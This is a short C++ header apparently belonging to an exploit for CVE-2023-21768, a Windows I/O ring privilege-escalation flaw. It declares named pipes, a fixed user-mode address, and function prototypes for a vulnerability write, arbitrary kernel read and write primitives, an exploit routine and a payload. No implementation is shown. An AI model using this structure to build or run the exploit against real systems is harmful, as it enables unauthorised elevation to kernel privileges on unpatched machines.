#pragma once
#define WIN32_LEAN_AND_MEAN
#include "def.hpp"

namespace CVE_2023_21768
{
    inline const LPCWSTR writePipeName = L"\\\\.\\pipe\\IoRingWrite";
    inline const LPCWSTR readPipeName = L"\\\\.\\pipe\\IoRingRead";
    inline constexpr ULONG_PTR ring3Addr = 0x1000000;
    void banner();
    bool writeVuln(ULONG_PTR targetAddr, DWORD val);
    bool arbitraryWrite(HIORING ioring, ULONG_PTR pBuffer, HANDLE hWPipeServer, HANDLE hWPipeClient, PVOID readSrc, PVOID readBuffer, DWORD readLen);
    bool arbitraryRead(HIORING ioring, ULONG_PTR pBuffer, HANDLE hRPipeServer, HANDLE hRPipeClient, PVOID Dst, PVOID Buffer, DWORD Len);
    bool Exp();
    void payload();
} // namespace CVE_2023_21768